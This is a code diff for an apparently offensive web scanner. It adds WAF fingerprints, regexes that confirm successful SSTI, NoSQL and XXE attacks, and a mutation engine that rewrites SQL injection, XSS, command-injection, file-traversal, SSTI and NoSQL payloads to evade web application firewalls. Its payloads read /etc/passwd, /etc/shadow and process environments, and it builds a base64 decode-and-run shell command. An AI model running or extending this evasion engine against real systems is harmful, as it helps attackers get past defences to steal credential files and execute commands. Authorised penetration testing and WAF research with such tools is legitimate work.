+    "synology_cloud": {
+        "headers": [],
+        "body":    [r"copyright.*\d{4}\s+synology\s+inc"],
+        "status":  {403},
+    },
+    "tencent_cloud": {
+        "headers": [],
+        "body":    [r"waf\.tencent-cloud\.com"],
+        "status":  {405},
+    },
+    "teros": {
+        "headers": [r"set-cookie:.*\bst8id\b"],
+        "body":    [],
+        "status":  {403},
+    },
+    "trafficshield": {
+        "headers": [r"server:\s*f5-trafficshield",
+                    r"set-cookie:.*\basinfo="],
+        "body":    [],
+        "status":  {403},
+    },
+    "transip": {
+        "headers": [r"x-transip-backend", r"x-transip-balancer"],
+        "body":    [],
+        "status":  {403},
+    },
+    "ucloud_uewaf": {
+        "headers": [r"server:\s*uewaf/"],
+        "body":    [r"uewaf_deny_pages", r"ucloud\.cn"],
+        "status":  {403},
+    },
+    "urlmaster_securitycheck": {
+        "headers": [r"urlmaster", r"urlrewritemodule", r"securitycheck"],
+        "body":    [],
+        "status":  {400},
+    },
+    "urlscan": {
+        "headers": [],
+        "body":    [r"rejected-by-urlscan", r"server erro in application"],
+        "status":  {403},
+    },
+    "varnish_owasp": {
+        "headers": [],
+        "body":    [r"request rejected by xvarnish-waf"],
+        "status":  {404},
+    },
+    "varnish_cachewall": {
+        "headers": [],
+        "body":    [r"error 403 naughty, not nice", r"varnish cache"],
+        "status":  {403},
+    },
+    "viettel": {
+        "headers": [],
+        "body":    [r"access denied.*viettel waf",
+                    r"cloudrity\.com\.vn",
+                    r"viettel waf system"],
+        "status":  {403},
+    },
+    "virusdie": {
+        "headers": [],
+        "body":    [r"cdn\.virusdie\.ru/splash/firewallstop\.png",
+                    r"virusdie\.ru",
+                    r"name=[\"']?fw_block[\"']?"],
+        "status":  {403},
+    },
+    "wallarm": {
+        "headers": [r"server:\s*nginx-wallarm"],
+        "body":    [],
+        "status":  {403},
+    },
+    "watchguard": {
+        "headers": [r"server:\s*watchguard"],
+        "body":    [r"request denied by watchguard firewall",
+                    r"watchguard technologies inc"],
+        "status":  {403},
+    },
+    "webarx": {
+        "headers": [],
+        "body":    [r"this request has been blocked by webarx web application firewall"],
+        "status":  {403},
+    },
+    "webknight": {
+        "headers": [r"webknight"],
+        "body":    [r"webknight application firewall alert",
+                    r"aqtronix\s+webknight"],
+        "status":  {999, 404},
+    },
+    "webland": {
+        "headers": [r"server:\s*apache protected by webland waf"],
+        "body":    [],
+        "status":  {403},
+    },
+    "webray": {
+        "headers": [r"server:\s*webray-waf", r"drivedby:\s*raysrv"],
+        "body":    [],
+        "status":  {403},
+    },
+    "webseal": {
+        "headers": [r"server:\s*webseal"],
+        "body":    [r"this is a webseal error message",
+                    r"webseal server received an invalid http request"],
+        "status":  {403},
+    },
+    "webtotem": {
+        "headers": [],
+        "body":    [r"the current request was blocked by webtotem"],
+        "status":  {403},
+    },
+    "west263cdn": {
+        "headers": [r"x-cache:\s*wt263cdn"],
+        "body":    [],
+        "status":  {403},
+    },
+    "wordfence": {
+        "headers": [],
+        "body":    [r"generated by wordfence",
+                    r"a potentially unsafe operation has been detected in your request",
+                    r"your access to this site has been limited",
+                    r"this response was generated by wordfence"],
+        "status":  {403},
+    },
+    "wts_waf": {
+        "headers": [r"server:\s*wts"],
+        "body":    [r"wts-waf"],
+        "status":  {403},
+    },
+    "xlabs_security": {
+        "headers": [r"x-cdn:\s*xlabs\s*security"],
+        "body":    [],
+        "status":  {403},
+    },
+    "xuanwudun": {
+        "headers": [],
+        "body":    [r"admin\.dbappwaf\.cn"],
+        "status":  {403},
+    },
+    "yunaq_chuangyu": {
+        "headers": [],
+        "body":    [r"365cyd\.(?:com|net)",
+                    r"help\.365cyd\.com"],
+        "status":  {403},
+    },
+    "yundun": {
+        "headers": [r"server:\s*yundun", r"x-cache:\s*yundun"],
+        "body":    [r"blocked by yundun cloud waf",
+                    r"yundun\.com/yd_http_error"],
+        "status":  {403},
+    },
+    "yunsuo": {
+        "headers": [r"set-cookie:.*yunsuo_session"],
+        "body":    [r"yunsuologo"],
+        "status":  {403},
+    },
+    "yxlink": {
+        "headers": [r"server:\s*yxlink-waf",
+                    r"set-cookie:.*yx_ci_session",
+                    r"set-cookie:.*yx_language"],
+        "body":    [],
+        "status":  {403},
+    },
+    "zenedge": {
+        "headers": [r"server:\s*zenedge", r"x-zen-fury"],
+        "body":    [r"/__zenedge/assets/"],
+        "status":  {403},
+    },
+    "zscaler": {
+        "headers": [r"server:\s*zscaler"],
+        "body":    [r"access denied.*accenture policy",
+                    r"policies\.accenture\.com",
+                    r"zscloud\.net",
+                    r"your organization has selected zscaler"],
         "status":  {403},
     },
 }
@@ -1973,6 +2926,75 @@ SUCCESS_PATTERNS = {
         r"Connection refused",
         r"ECONNREFUSED",
         r"No route to host",
+    ],
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #   SSTI: detect evaluated math result in response
+    # ─────────────────────────────────────────────────────────────────────────
+    "SSTI": [
+        r"\b49\b",                          # 7*7 evaluated
+        r"10489684478481",                  # 2413413*4342737 (unique fingerprint)
+        r"uid=\d+\(",                       # RCE confirmed
+        r"root:.*:0:0",                     # /etc/passwd via RCE
+        r"<Jinja2\s+Environment",           # Jinja2 config dump
+        r"freemarker\.template",            # Freemarker stack trace
+        r"velocity.*template",              # Velocity error
+        r"org\.thymeleaf",                  # Thymeleaf
+        r"groovy\.lang",                    # Groovy/Grails
+        r"smarty.*error",                   # Smarty PHP error
+        r"ERB\s+rendering",                 # Ruby ERB
+        r"ActionView::Template::Error",     # Rails template error
+        r"jinja2\.exceptions",              # Jinja2 exception leaked
+        r"\{%.*%\}",                        # Twig/Jinja syntax reflected intact
+        r"tornado\.template",               # Tornado
+        r"mako\.exceptions",               # Mako
+    ],
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #   NoSQL: MongoDB operator evaluation / error leakage
+    # ─────────────────────────────────────────────────────────────────────────
+    "NoSQL Injection": [
+        r"MongoError",
+        r"mongo.*exception",
+        r"mongodb.*error",
+        r"SyntaxError.*javascript",        # $where JS eval error
+        r"ReferenceError",                  # JS in $where
+        r"TypeError.*filter",
+        r"\$where.*failed",
+        r"invalid.*operator",
+        r"unknown.*operator.*\$",
+        r"CastError",                       # Mongoose type error
+        r"ValidatorError",
+        r"11000.*duplicate",               # MongoDB duplicate key — auth bypass worked
+        r"too many documents",
+        r"\[object Object\]",              # JS object leaked
+        r"redis.*ERR",
+        r"\-ERR.*wrong",                   # Redis error
+        r"ElasticsearchException",
+        r"SearchPhaseExecutionException",
+    ],
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #   XXE: file content / SSRF evidence in response
+    # ─────────────────────────────────────────────────────────────────────────
+    "XXE": [
+        r"root:x:0:0",                     # /etc/passwd read
+        r"\[extensions\]",                  # win.ini read
+        r"PROCESSOR_IDENTIFIER",            # Windows env
+        r"ami-id",                          # AWS metadata via XXE→SSRF
+        r"169\.254\.169\.254",
+        r"<?xml.*?>",                       # XML reflected (may contain injected entity)
+        r"DOCTYPE.*SYSTEM",                 # DOCTYPE reflected (entity injection may have fired)
+        r"SAXParseException",               # XML parser error (entity resolution attempted)
+        r"XMLSyntaxError",
+        r"XML.*parsing.*error",
+        r"external.*entity",
+        r"ExternalEntityExpansion",
+        r"dtd.*not allowed",                # DTD processing mentioned → confirmed parsing
+        r"javax\.xml",                      # Java XML parser stack trace
+        r"lxml\.etree",                     # Python lxml stack trace
+        r"libxml2",
+        r"ENTITY.*declared",
     ],
 }
 
@@ -2573,11 +3595,18 @@ def tamper_dollarquoting(sql):
 
 
 # Fullwidth unicode map (A-Z / a-z → U+FF21-U+FF3A / U+FF41-U+FF5A)
+# Jython 2.7 / CPython 2: chr() only accepts 0-255 — must use unichr() for
+# codepoints above 255.  CPython 3 merged chr()/unichr() so we need a compat shim.
+try:
+    _unichr = unichr   # Jython 2.7 / CPython 2
+except NameError:
+    _unichr = chr      # CPython 3+
+
 _FULLWIDTH_MAP = {}
-for _i in range(0x41, 0x5B):   # A-Z
-    _FULLWIDTH_MAP[chr(_i)] = chr(_i - 0x41 + 0xFF21)
-for _i in range(0x61, 0x7B):   # a-z
-    _FULLWIDTH_MAP[chr(_i)] = chr(_i - 0x61 + 0xFF41)
+for _i in range(0x41, 0x5B):   # A-Z  (U+0041–U+005A → U+FF21–U+FF3A)
+    _FULLWIDTH_MAP[chr(_i)] = _unichr(_i - 0x41 + 0xFF21)
+for _i in range(0x61, 0x7B):   # a-z  (U+0061–U+007A → U+FF41–U+FF5A)
+    _FULLWIDTH_MAP[chr(_i)] = _unichr(_i - 0x61 + 0xFF41)
 
 
 def tamper_fullwidthunicode(sql):
@@ -2789,6 +3818,488 @@ SQLI_TAMPERS = [
     # ── JSON-inline (Claroty Team82) ──────────────────────────────────────────
     ("jsoninline",             tamper_json_inline,            "1=1 → JSON_LENGTH('{}')<=8896 + distinctrow", "mysql,pgsql,mssql,sqlite"),
 ]
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#   SYSTEMATIC MUTATION ENGINE
+#   When a WAF blocks a specific payload, this engine generates an ordered
+#   tree of semantically-equivalent mutations to find the first one that
+#   slips through.  The escalation order is:
+#
+#     Tier 1 — Semantic equivalence (same logic, different expression)
+#              AND 1=1 → AND 10>5 → AND 2+3=5 → AND TRUE → …
+#     Tier 2 — Whitespace substitution (space → comment/tab/newline)
+#     Tier 3 — Keyword case variants  (AND → AnD, SELECT → SeLeCt)
+#     Tier 4 — Operator substitution  (= → LIKE, > → BETWEEN)
+#     Tier 5 — Literal encoding       (1 → 0x31, CHAR(49), 1e0)
+#     Tier 6 — Structural wrapping    ((expr), /*!expr*/, subquery)
+#     Tier 7 — Combined               (whitespace + case in one shot)
+#
+#   For XSS and CMDi, analogous tiers cover event handlers, tags, separators,
+#   command substitutions, and shell metacharacter alternatives.
+#
+#   Integration: _phase_payloads() calls _systematic_mutations(vtype, payload)
+#   when the base probe is blocked, and iterates through the returned list
+#   (capped at MAX_MUTATIONS_PER_PAYLOAD) until one is not blocked.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+MAX_MUTATIONS_PER_PAYLOAD = 25  # per-payload cap — keeps request count sane
+
+# ── SQLi: ordered semantic TRUE equivalents ──────────────────────────────────
+# Each expression evaluates to TRUE in MySQL / MSSQL / PostgreSQL / SQLite.
+# Ordered from least-suspicious to most-suspicious from a WAF rule perspective.
+_SQLI_TRUE_EQUIV = [
+    ("10>5",                    "numeric_gt"),
+    ("2+3=5",                   "arithmetic_sum"),
+    ("100>50",                  "large_numeric_gt"),
+    ("6-1=5",                   "arithmetic_sub"),
+    ("4/2=2",                   "arithmetic_div"),
+    ("3*3=9",                   "arithmetic_mul"),
+    ("1<=1",                    "lte_operator"),
+    ("1>=1",                    "gte_operator"),
+    ("1!=2",                    "neq_bang"),
+    ("1<>2",                    "neq_arrow"),
+    ("1 BETWEEN 0 AND 2",       "between_op"),
+    ("3 BETWEEN 2 AND 4",       "between_large"),
+    ("1 IN(1,2,3)",             "in_list"),
+    ("2 NOT IN(3,4,5)",         "not_in"),
+    ("'a'='a'",                 "string_equality"),
+    ("'x'='x'",                 "string_equality_x"),
+    ("'abc'='abc'",             "string_equality_word"),
+    ("NULL IS NULL",            "null_is_null"),
+    ("1 LIKE 1",                "like_numeric"),
+    ("'a' LIKE 'a'",            "like_string"),
+    ("TRUE",                    "keyword_true"),
+    ("NOT FALSE",               "not_false"),
+    ("NOT(1=2)",                "not_parens"),
+    ("(1=1)",                   "parens_tautology"),
+    ("((1=1))",                 "double_parens"),
+    ("1.0=1",                   "float_comparison"),
+    ("1e0=1",                   "scientific_comparison"),
+    ("0x31=0x31",               "hex_equality"),
+    ("CHAR(49)=CHAR(49)",       "char_function"),
+    ("ASCII('A')=65",           "ascii_function"),
+    ("LENGTH('x')=1",           "length_function"),
+    ("ABS(-1)=1",               "abs_function"),
+    ("LOWER('a')='a'",          "lower_function"),
+    ("UPPER('A')='A'",          "upper_function"),
+    ("SUBSTR('abc',1,1)='a'",   "substr_function"),
+    ("COALESCE(1,0)=1",         "coalesce_function"),
+    ("IFNULL(1,0)=1",           "ifnull_function"),
+    ("(SELECT 1)=1",            "subquery_scalar"),
+    ("(SELECT 2+3)=5",          "subquery_arithmetic"),
+    ("MID('AB',1,1)='A'",       "mid_function"),
+    ("TRIM(' a ')='a'",         "trim_function"),
+    ("REVERSE('ab')='ba'",      "reverse_function"),
+    ("HEX(255)='FF'",           "hex_function"),
+    ("UNHEX('61')='a'",         "unhex_function"),
+    ("BIN(1)='1'",              "bin_function"),
+    ("OCT(8)='10'",             "oct_function"),
+    ("SIGN(5)=1",               "sign_function"),
+    ("FLOOR(1.9)=1",            "floor_function"),
+    ("CEIL(1.1)=2",             "ceil_function"),
+    ("MOD(5,2)=1",              "mod_function"),
+    ("POW(2,3)=8",              "pow_function"),
+    ("ROUND(1.4)=1",            "round_function"),
+]
+
+# ── SQLi: whitespace alternatives ────────────────────────────────────────────
+_SQLI_WS = [
+    ("/**/",    "comment"),
+    ("%09",     "tab_urlenc"),
+    ("%0a",     "newline_urlenc"),
+    ("%0d",     "cr_urlenc"),
+    ("%0b",     "vtab_urlenc"),
+    ("%0c",     "ff_urlenc"),
+    ("%a0",     "nbsp_urlenc"),
+    ("\t",      "tab_raw"),
+    ("\n",      "newline_raw"),
+    ("/*!*/",   "empty_version_comment"),
+    ("/*--*/",  "comment_dashes"),
+]
+
+# ── SQLi: keyword mutations ───────────────────────────────────────────────────
+_SQLI_KEYWORDS = {
+    "AND":    ["AnD", "aNd", "&&", "/*!AND*/",    "/*!50000AND*/", "/**AND**/"],
+    "OR":     ["oR",  "Or",  "||", "/*!OR*/",     "/**OR**/"],
+    "SELECT": ["SeLeCt", "/*!SELECT*/", "/*!50000SELECT*/", "SeLeC\x00t"],
+    "UNION":  ["UnIoN",  "/*!UNION*/",  "UnI/**/oN"],
+    "WHERE":  ["wHeRe",  "/*!WHERE*/"],
+    "FROM":   ["FrOm",   "/*!FROM*/"],
+    "SLEEP":  ["SLeeP",  "SlEeP"],
+    "ORDER":  ["OrDeR",  "oRdEr"],
+    "BY":     ["bY",     "By"],
+    "LIMIT":  ["LiMiT",  "lImIt"],
+}
+
+# ── SQLi: operator alternatives ───────────────────────────────────────────────
+_SQLI_OPS = [
+    ("=1 AND",  "=1/**/AND",  "comment_before_and"),
+    (" = ",     "%20=%20",    "urlenc_equals"),
+    ("=",       " LIKE ",     "like_for_equals"),
+    (">",       " BETWEEN X AND 9999 AND X", "between_for_gt"),
+]
+
+
+def _systematic_sqli(payload):
+    """
+    Return an ordered list of (mutated_payload, tier_label) pairs for a
+    blocked SQLi payload. Ordered by mutation cost (cheapest first).
+    """
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # ── Tier 1: Semantic equivalents — replace the boolean condition ──────────
+    # Detect the boolean expression in payload (e.g., "1=1" after AND/OR)
+    cond_match = re.search(
+        r'\b(AND|OR)\s+([^\-\-#\n]+?)(\s*(?:--|#|/\*))',
+        payload, re.IGNORECASE)
+    if cond_match:
+        prefix  = payload[:cond_match.start(2)]
+        suffix  = payload[cond_match.end(2):]
+        op_word = cond_match.group(1)
+        for equiv, label in _SQLI_TRUE_EQUIV:
+            _add(prefix + equiv + " " + suffix.lstrip(), "T1:sem:%s" % label)
+    else:
+        # No clear AND/OR block — still try wrapping common 1=1 forms
+        for equiv, label in _SQLI_TRUE_EQUIV[:10]:
+            rewritten = re.sub(r'1\s*=\s*1', equiv, payload, flags=re.IGNORECASE)
+            _add(rewritten, "T1:rewrite:%s" % label)
+            rewritten2 = re.sub(r"'1'\s*=\s*'1'", "'" + equiv.split("=")[0].strip() + "'='" + equiv.split("=")[0].strip() + "'", payload)
+            _add(rewritten2, "T1:str:%s" % label)
+
+    # ── Tier 2: Whitespace substitution ──────────────────────────────────────
+    for ws_repl, ws_label in _SQLI_WS:
+        _add(payload.replace(" ", ws_repl), "T2:ws:%s" % ws_label)
+        # Also partial: only replace spaces between keyword and value
+        _add(re.sub(r'(\bAND\b|\bOR\b) ', r'\1' + ws_repl, payload, flags=re.IGNORECASE),
+             "T2:ws_kw:%s" % ws_label)
+
+    # ── Tier 3: Keyword case variants ────────────────────────────────────────
+    for kw, variants in _SQLI_KEYWORDS.items():
+        if re.search(r'\b' + kw + r'\b', payload, re.IGNORECASE):
+            for variant in variants:
+                _add(re.sub(r'\b' + kw + r'\b', variant, payload, flags=re.IGNORECASE),
+                     "T3:kw:%s->%s" % (kw, variant[:8]))
+
+    # ── Tier 4: Numeric literal encoding ─────────────────────────────────────
+    for digit in ['0', '1', '2', '3']:
+        if digit in payload:
+            _add(payload.replace(digit, "0x3" + digit, 1), "T4:hex:0x3%s" % digit)
+            _add(payload.replace(digit, "CHAR(%d)" % ord(digit), 1), "T4:char:%s" % digit)
+            _add(payload.replace(digit, digit + ".0", 1),  "T4:float:%s.0" % digit)
+            _add(payload.replace(digit, digit + "e0", 1),  "T4:sci:%se0" % digit)
+
+    # ── Tier 5: Parentheses wrapping ─────────────────────────────────────────
+    inner_match = re.search(r"(AND|OR)\s+(.+?)\s*(--|#|$)", payload, re.IGNORECASE)
+    if inner_match:
+        _add(payload[:inner_match.start(2)] + "(" + inner_match.group(2) + ")" +
+             payload[inner_match.end(2):], "T5:wrap_parens")
+        _add(payload[:inner_match.start(2)] + "((" + inner_match.group(2) + "))" +
+             payload[inner_match.end(2):], "T5:double_parens")
+
+    # ── Tier 6: Version-gated comment wrapping ────────────────────────────────
+    _add(re.sub(r'\b(AND|OR)\b', r'/*!50000\1*/', payload, flags=re.IGNORECASE),
+         "T6:version_comment")
+    _add(re.sub(r'\b(AND|OR)\b', r'/*!80000\1*/', payload, flags=re.IGNORECASE),
+         "T6:version_comment_8")
+
+    # ── Tier 7: Combined whitespace + keyword case ────────────────────────────
+    combined = payload.replace(" ", "/**/")
+    for kw, variants in list(_SQLI_KEYWORDS.items())[:3]:
+        combined = re.sub(r'\b' + kw + r'\b', variants[0], combined,
+                          flags=re.IGNORECASE, count=1)
+    _add(combined, "T7:combined_ws_kw")
+
+    return results
+
+
+def _systematic_xss(payload):
+    """
+    Ordered mutation list for a blocked XSS payload.
+    """
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # ── Tier 1: Event handler alternatives ───────────────────────────────────
+    _events = [
+        "onerror", "onload", "onfocus", "onclick", "onmouseover", "ontoggle",
+        "onstart", "onpointerover", "onanimationend", "onwheel", "oninput",
+        "onblur", "onkeyup", "oncut", "oncopy", "onpaste", "ondrag",
+        "onpointerenter", "onscroll", "onsearch", "onbeforeinput",
+    ]
+    for ev in _events:
+        m = _add(re.sub(r'\bon\w+\b', ev, payload, count=1, flags=re.IGNORECASE),
+                 "T1:event:%s" % ev)
+
+    # ── Tier 2: HTML tag alternatives ────────────────────────────────────────
+    _tags = ["img", "svg", "video", "audio", "body", "details", "input",
+             "select", "textarea", "iframe", "object", "embed", "marquee"]
+    for tag in _tags:
+        _add(re.sub(r'<\w+\b', "<" + tag, payload, count=1), "T2:tag:<%s>" % tag)
+
+    # ── Tier 3: Inject whitespace inside event attribute name ─────────────────
+    _add(re.sub(r'(on\w+)(=)', r'\1\t\2', payload, count=1), "T3:tab_in_event")
+    _add(re.sub(r'(on\w+)(=)', r'\1\n\2', payload, count=1), "T3:lf_in_event")
+    _add(re.sub(r'(on\w+)(=)', r'\1 \2',  payload, count=1), "T3:sp_in_event")
+    _add(re.sub(r'(on\w+)(=)', r'\1\x00\2', payload, count=1), "T3:null_in_event")
+
+    # ── Tier 4: Entity-encode a character inside event name ──────────────────
+    for ch_from, ch_to, label in [
+        ("on", "o&#110;", "entity_n"),
+        ("on", "o\x00n",  "null_in_on"),
+        ("er", "&#101;r", "entity_e"),
+        ("al", "&#97;l",  "entity_a"),
+    ]:
+        _add(payload.replace(ch_from, ch_to, 1), "T4:enc:%s" % label)
+
+    # ── Tier 5: Case variation of event + tag ─────────────────────────────────
+    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).upper(),    payload), "T5:event_upper")
+    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).title(),    payload), "T5:event_title")
+    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).swapcase(), payload), "T5:event_swap")
+
+    # ── Tier 6: alert() alternatives ─────────────────────────────────────────
+    for alt in ["confirm(1)", "prompt(1)", "alert`1`", "(alert)(1)",
+                "eval('ale'+'rt(1)')", "window['ale'+'rt'](1)",
+                "top['al'+'ert'](1)", "self[`ale`+`rt`](1)"]:
+        _add(re.sub(r'alert\([^)]*\)', alt, payload), "T6:fn:%s" % alt[:12])
+
+    # ── Tier 7: Quote context ─────────────────────────────────────────────────
+    _add("'>" + payload,    "T7:sq_breakout")
+    _add("\">" + payload,   "T7:dq_breakout")
+    _add("</tag>" + payload, "T7:close_tag")
+    _add(payload.replace('"', "'"),  "T7:dq_to_sq")
+    _add(payload.replace("'", "\""), "T7:sq_to_dq")
+
+    return results
+
+
+def _systematic_cmdi(payload):
+    """
+    Ordered mutation list for a blocked CMDi payload.
+    """
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # ── Tier 1: Separator alternatives ───────────────────────────────────────
+    for sep_from, seps in [
+        (";",  ["|", "&&", "||", "&", "%0a", "%0d%0a", "`", "$(", ";"]),
+        ("|",  [";", "&&", "||", "&", "%0a"]),
+        ("&&", [";", "|",  "||"]),
+    ]:
+        if sep_from in payload:
+            for sep_to in seps:
+                if sep_to != sep_from:
+                    _add(payload.replace(sep_from, sep_to, 1),
+                         "T1:sep:%s->%s" % (sep_from, sep_to.replace("%", "pct_")))
+
+    # ── Tier 2: Whitespace in command ────────────────────────────────────────
+    for ws, label in [("${IFS}", "ifs"), ("%09", "tab"), ("%0a", "lf"), ("\t", "tab_raw"), ("<", "redir")]:
+        _add(payload.replace(" ", ws), "T2:ws:%s" % label)
+
+    # ── Tier 3: Command alternatives ─────────────────────────────────────────
+    _cmd_alts = {
+        "id":               ["whoami", "uname${IFS}-a", "hostname"],
+        "whoami":           ["id", "echo${IFS}$USER"],
+        "cat /etc/passwd":  ["cat${IFS}/etc/passwd", "/bin/cat /etc/passwd",
+                             "head${IFS}/etc/passwd", "less /etc/passwd"],
+        "cat":              ["c'a't", "c\"a\"t", "/b'i'n/cat", "\\cat",
+                             "$(printf \\x63\\x61\\x74)"],
+    }
+    for cmd, alts in _cmd_alts.items():
+        if cmd in payload:
+            for alt in alts:
+                _add(payload.replace(cmd, alt, 1), "T3:cmd:%s" % alt[:12])
+
+    # ── Tier 4: Quote obfuscation ─────────────────────────────────────────────
+    _add(payload.replace("cat", "c'a't"),         "T4:split_sq")
+    _add(payload.replace("cat", "c\"a\"t"),        "T4:split_dq")
+    _add(payload.replace("/bin/", "/b''in/"),      "T4:split_bin")
+    _add(payload.replace("/etc/", "/e''tc/"),      "T4:split_etc")
+
+    # ── Tier 5: Path globbing ─────────────────────────────────────────────────
+    _add(payload.replace("/etc/passwd", "/???/p?ss??"),  "T5:glob_passwd")
+    _add(payload.replace("/bin/",       "/b??/"),        "T5:glob_bin")
+    _add(payload.replace("cat",         "/???/c?t"),     "T5:glob_cat")
+
+    # ── Tier 6: Base64 decode-exec ────────────────────────────────────────────
+    import base64 as _b64
+    try:
+        cmd_part = re.search(r'[;|&]\s*(.+)', payload)
+        if cmd_part:
+            cmd_b64 = _b64.b64encode(cmd_part.group(1).encode()).decode()
+            _add(payload[:cmd_part.start(1)] + "$(echo %s|base64 -d|sh)" % cmd_b64,
+                 "T6:b64_exec")
+    except Exception:
+        pass
+
+    # ── Tier 7: IFS manipulation ──────────────────────────────────────────────
+    _add(re.sub(r';(\s*)(\w)', r';IFS=_;X=\2', payload), "T7:ifs_manip")
+    _add(payload + ";true", "T7:noop_suffix")
+
+    return results
+
+
+def _systematic_lfi(payload):
+    """
+    Ordered mutation list for a blocked LFI payload.
+    """
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # ── Tier 1: Traversal depth variants ─────────────────────────────────────
+    for depth in range(2, 9):
+        travs = "../" * depth
+        for target in ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "etc/passwd"]:
+            _add(travs + target, "T1:depth%d" % depth)
+
+    # ── Tier 2: Encoding the dot-dot-slash ───────────────────────────────────
+    _encodings = [
+        ("../",  "%2e%2e/",        "urlenc_dots"),
+        ("../",  "..%2f",          "urlenc_slash"),
+        ("../",  "%2e%2e%2f",      "urlenc_all"),
+        ("../",  "....//",         "double_dot_slash"),
+        ("../",  "..;/",           "semicolon"),
+        ("../",  "%252e%252e/",    "double_urlenc"),
+        ("../",  "..%c0%af",       "overlong_slash"),
+        ("../",  "%c0%ae%c0%ae/",  "overlong_dot"),
+        ("../",  "\\..",           "backslash"),
+        ("../",  "..\\",           "backslash2"),
+    ]
+    for from_str, to_str, label in _encodings:
+        if from_str in payload:
+            _add(payload.replace(from_str, to_str), "T2:%s" % label)
+
+    # ── Tier 3: Null byte + extension bypass ──────────────────────────────────
+    for ext in [".php", ".html", ".jpg", ".png", ".gif", ".txt"]:
+        _add(payload + "%00" + ext, "T3:null_ext:%s" % ext)
+        _add(payload + "\x00" + ext, "T3:null_raw:%s" % ext)
+
+    # ── Tier 4: Path alternatives ─────────────────────────────────────────────
+    for from_p, to_p in [
+        ("/etc/passwd", "/etc/./passwd"),
+        ("/etc/passwd", "/etc//passwd"),
+        ("/etc/passwd", "/etc/passwd%20"),
+        ("/etc/passwd", "/etc/PASSWD"),
+        ("etc/passwd",  "ETC/PASSWD"),
+    ]:
+        _add(payload.replace(from_p, to_p), "T4:alt_path")
+
+    return results
+
+
+def _systematic_ssti(payload):
+    """Ordered mutation list for a blocked SSTI payload."""
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # ── Different delimiters ─────────────────────────────────────────────────
+    for tmpl_open, tmpl_close, label in [
+        ("{{", "}}",   "jinja2_curly"),
+        ("${", "}",    "el_dollar"),
+        ("#{", "}",    "ruby_hash"),
+        ("<%= ", " %>","erb"),
+        ("%{", "}",    "percent_brace"),
+        ("@(", ")",    "razor"),
+        ("#(", ")",    "hash_paren"),
+        ("{%=", "%}",  "twig_print"),
+    ]:
+        _add(tmpl_open + "7*7" + tmpl_close, "T1:delim:%s" % label)
+        _add(tmpl_open + "2413413*4342737" + tmpl_close, "T1:bignum:%s" % label)
+
+    # ── Whitespace inside template expression ────────────────────────────────
+    _add("{{ 7 * 7 }}", "T2:ws_jinja")
+    _add("{{7 * 7}}",   "T2:ws_jinja_half")
+    _add("${ 7 * 7 }", "T2:ws_el")
+
+    # ── Encoding the delimiters ──────────────────────────────────────────────
+    _add("%7B%7B7*7%7D%7D",  "T3:urlenc_curlies")
+    _add("&#123;&#123;7*7&#125;&#125;", "T3:html_entity_curlies")
+
+    return results
+
+
+def _systematic_nosql(payload):
+    """Ordered mutation list for a blocked NoSQL payload."""
+    results = []
+    seen = set()
+
+    def _add(p, label):
+        if p not in seen and p != payload:
+            seen.add(p)
+            results.append((p, label))
+
+    # Operator alternatives
+    for op_from, op_to in [
+        ("$ne",  "$gt"),
+        ("$ne",  "$lt"),
+        ("$ne",  "$gte"),
+        ("$ne",  "$lte"),
+        ("$ne",  "$nin"),
+        ("$gt",  "$ne"),
+        ("$gt",  "$gte"),
+        ("$gt",  "$exists"),
+        ("$regex", "$where"),
+    ]:
+        if op_from in payload:
+            _add(payload.replace(op_from, op_to, 1), "T1:op:%s->%s" % (op_from, op_to))
+
+    # Encoding variants
+    _add(payload.replace("$", "%24"),  "T2:urlenc_dollar")
+    _add(payload.replace("[", "%5B").replace("]", "%5D"), "T2:urlenc_brackets")
+
+    return results
+
+
+# ── Dispatch table: vtype → mutation function ────────────────────────────────
+_MUTATION_DISPATCH = {
+    "SQL Injection":     _systematic_sqli,
+    "XSS":               _systematic_xss,
+    "Command Injection": _systematic_cmdi,
+    "LFI":               _systematic_lfi,
+    "SSTI":              _systematic_ssti,
+    "NoSQL Injection":   _systematic_nosql,
+}
+
+
+def _get_systematic_mutations(vtype, payload):
+    """
+    Public entry point.  Returns an ordered list of
+    (mutated_payload, tier_label) pairs for the given vtype.
+    Capped at MAX_MUTATIONS_PER_PAYLOAD.
+    """
+    fn = _MUTATION_DISPATCH.get(vtype)
+    if fn is None:
+        return []
+    try:
+        return fn(payload)[:MAX_MUTATIONS_PER_PAYLOAD]
+    except Exception:
+        return []
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -3460,6 +4971,28 @@ class ScanEngine(object):
             self._log("[ISSUE ERROR] " + str(ex))
 
     # ── WAF / success detection ───────────────────────────────────────────────
+    @staticmethod
+    def _normalize_body_for_baseline(body):
+        """
+        Strip dynamic content that changes between requests to the same WAF block page:
+          - F5 BIG-IP ASM: "Your support ID is: 1967131907065003834"  (18-digit ID)
+          - Imperva/Incapsula: incident IDs, session tokens
+          - Cloudflare: Ray IDs   "Ray ID: 7c4a1b2e3d4f5a6b"
+          - Generic: any long numeric run (≥ 10 digits), UUIDs, Unix timestamps
+          - HTML comment timestamps / nonces injected by WAF
+        Returns lowercased, whitespace-collapsed, ID-stripped string for stable comparison.
+        """
+        bl = body.lower()
+        # F5 BIG-IP ASM support IDs and Imperva incident IDs (long digit runs)
+        bl = re.sub(r'\d{10,}', 'DYNID', bl)
+        # Cloudflare/Akamai Ray IDs (16-char hex)
+        bl = re.sub(r'\b[0-9a-f]{16}\b', 'RAYHEX', bl)
